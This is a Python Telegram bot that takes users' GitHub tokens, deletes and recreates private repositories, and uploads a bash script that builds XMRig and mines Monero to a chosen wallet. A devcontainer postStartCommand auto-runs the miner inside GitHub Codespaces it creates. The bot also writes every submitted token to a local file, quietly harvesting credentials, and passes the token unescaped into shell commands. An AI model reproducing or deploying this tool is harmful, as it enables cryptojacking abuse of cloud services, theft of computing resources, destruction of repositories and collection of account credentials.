import telebot
import requests
import json
import base64
import subprocess
import time
import random
import os

BOT_TOKEN = '7'
ADMIN_ID = 80
bot = telebot.TeleBot(BOT_TOKEN)

ALLOWED_USERS = {ADMIN_ID}
TOKEN_FILE = "token.txt"
WALLET_FILE = "wallets.txt"
USER_FILE = "user.txt"

user_wallets = {}
user_workers = {}

try:
    with open("allowed_users.txt") as f:
        ALLOWED_USERS.update(map(int, f.read().splitlines()))
except:
    pass

if os.path.exists(WALLET_FILE):
    with open(WALLET_FILE) as f:
        for line in f:
            chat_id, wallet = line.strip().split(":")
            user_wallets[int(chat_id)] = wallet

if os.path.exists(USER_FILE):
    with open(USER_FILE) as f:
        for line in f:
            chat_id, worker = line.strip().split(":")
            user_workers[int(chat_id)] = worker

def save_allowed_users():
    with open("allowed_users.txt", "w") as f:
        f.write("\n".join(map(str, ALLOWED_USERS)))

def save_wallets():
    with open(WALLET_FILE, "w") as f:
        for chat_id, wallet in user_wallets.items():
            f.write(f"{chat_id}:{wallet}\n")

def save_workers():
    with open(USER_FILE, "w") as f:
        for chat_id, worker in user_workers.items():
            f.write(f"{chat_id}:{worker}\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    if message.chat.id != ADMIN_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        ALLOWED_USERS.add(user_id)
        save_allowed_users()
        bot.reply_to(message, f"✅ User {user_id} added.")
    except:
        bot.reply_to(message, "⚠️ Usage: /add <user_id>")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.chat.id != ADMIN_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        ALLOWED_USERS.discard(user_id)
        save_allowed_users()
        bot.reply_to(message, f"❌ User {user_id} removed.")
    except:
        bot.reply_to(message, "⚠️ Usage: /remove <user_id>")

@bot.message_handler(commands=['wallet'])
def set_wallet(message):
    if message.chat.id not in ALLOWED_USERS:
        return
    try:
        wallet = message.text.split()[1]
        user_wallets[message.chat.id] = wallet
        save_wallets()
        bot.reply_to(message, "✅ Wallet saved!")
    except:
        bot.reply_to(message, "⚠️ Usage: /wallet <wallet_address>")

@bot.message_handler(commands=['token'])
def set_token(message):
    if message.chat.id not in ALLOWED_USERS:
        return
    if message.chat.id not in user_wallets:
        bot.reply_to(message, "⚠️ Set wallet first using /wallet <wallet>")
        return
    try:
        token = message.text.split()[1]
        wallet = user_wallets[message.chat.id]

       
        if message.chat.id not in user_workers:
            worker = f"worker{random.randint(1000, 9999)}"
            user_workers[message.chat.id] = worker
            save_workers()
        else:
            worker = user_workers[message.chat.id]

        headers = {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}
        user_resp = requests.get("https://api.github.com/user", headers=headers)
        if user_resp.status_code != 200:
            bot.reply_to(message, "❌ Invalid GitHub token.")
            return
        username = user_resp.json()["login"]
        bot.reply_to(message, f"✅ Logged in as {username}\nCreating repos...")

        for repo in ["soul", "soul2"]:
            requests.delete(f"https://api.github.com/repos/{username}/{repo}", headers=headers)
            requests.post("https://api.github.com/user/repos", headers=headers, json={
                "name": repo, "private": True, "auto_init": True
            })


            soulsh = f"""#!/bin/bash

WALLET="{wallet}"
POOL="pool.supportxmr.com:3333"
WORKER="{worker}"

echo "[+] Starting setup..."

install_dependencies() {{
    echo "[+] Installing required packages..."
    sudo apt update -y
    sudo apt upgrade -y
    sudo apt install -y git build-essential cmake automake libtool autoconf libhwloc-dev libuv1-dev libssl-dev msr-tools
}}

build_xmrig() {{
    echo "[+] Cloning XMRig repository..."
    git clone https://github.com/xmrig/xmrig.git
    cd xmrig
    mkdir build && cd build
    echo "[+] Building XMRig, please wait..."
    cmake ..
    make -j$(nproc)
}}

start_mining() {{
    echo "[+] Waiting for 180 seconds before starting mining (sleep)..."
    sleep 180
    echo "[+] Starting XMRig miner now!"
    ./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero &
    miner_pid=$!

    echo "[+] Mining will auto-stop after 2 hours..."
    sleep 7200
    echo "[+] Stopping miner process..."
    kill $miner_pid

    echo "[+] Cleaning up and exiting..."
    exit 0
}}

if [ -d "xmrig" ]; then
    echo "[+] XMRig directory found. Skipping clone."
    cd xmrig/build
else
    install_dependencies
    build_xmrig
fi

start_mining
"""

            devcontainer = {
                "name": "XMRig Miner",
                "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
                "features": {
                    "ghcr.io/devcontainers/features/sshd:1": {
                        "version": "latest"
                    }
                },
                "postStartCommand": "chmod +x soul.sh && ./soul.sh"
            }

            def upload(repo, path, content):
                url = f"https://api.github.com/repos/{username}/{repo}/contents/{path}"
                b64 = base64.b64encode(content.encode()).decode()
                return requests.put(url, headers=headers, json={
                    "message": f"Add {path}",
                    "content": b64,
                    "branch": "main"
                })

            upload(repo, "soul.sh", soulsh)
            upload(repo, ".devcontainer/devcontainer.json", json.dumps(devcontainer, indent=2))

            subprocess.run(f'echo {token} | gh auth login --with-token', shell=True, text=True, input=token)
            subprocess.run(f'gh codespace create --repo {username}/{repo} --machine standardLinux32gb', shell=True)

        with open("token.txt", "a") as f:
            f.write(f"{token}\n")

        bot.reply_to(message, "✅ Codespace active 24x7 by soulcrack")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

bot.polling()
